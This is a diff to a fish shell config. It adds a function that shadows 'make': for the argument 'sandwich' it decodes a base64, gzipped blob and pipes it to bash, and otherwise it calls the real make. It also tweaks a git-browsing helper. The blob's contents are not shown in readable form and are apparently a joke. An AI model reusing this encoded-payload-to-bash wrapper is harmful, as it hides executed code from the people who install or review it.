@@ -1,3 +1,11 @@
+function make
+    if test (count $argv) -eq 1 ; and [ "$argv" = "sandwich" ]
+        echo "H4sIABaKXVsA/2VQwU7EIBS88xXPjYfdgwlm0WCMB3dXYyvx0pj0qk3pcqEHYXETP36BUqRAM3l5701nBgSH9RquXz6rA1w9AYbN5hHUsZcI7Om74wirj3E1db9CIS6Qn1b752EJoliDI+qzn0vWkPeSSx1/7mWo2tX21RR8Nml5BF3P9bttwT/Fnch9d531zvguS5dyZ21bd5Rb7Bc6VLe3D/wf7v+Yy3rT04L/ZnSb5J/eJLzR1hT56zPRTKS4m300a2xOq5Xpq/KecTcwM6b3HyqRfzj4YAl/8P31098TuDmgC1Yc6mIaAgAA" | base64 --decode | gunzip | bash
+    else
+        eval (which make) $argv
+    end  
+end
+
 function load-env --description "load docker env file"
     for i in (cat $argv | grep -o '^[^#]*')
         set arr (echo $i |tr = \n)
@@ -35,10 +43,17 @@ function zg --description 'search through git history'
 end
 
 function gogit --description 'zcd to the directory and open the git remote in the browser'
-	pushd .
-	z $argv
+	set argc (count $argv)
+	if test $argc -gt 0 
+        pushd .
+        z $argv
+    end
+
 	open (git remote get-url (git remote | head -n1) | sed -r 's/git@(.*):(.*)\.git/https:\/\/\1\/\2/g') 2>&1 >/dev/null
-	popd
+
+	if test $argc -gt 0 
+        popd
+    end
 end
 
 
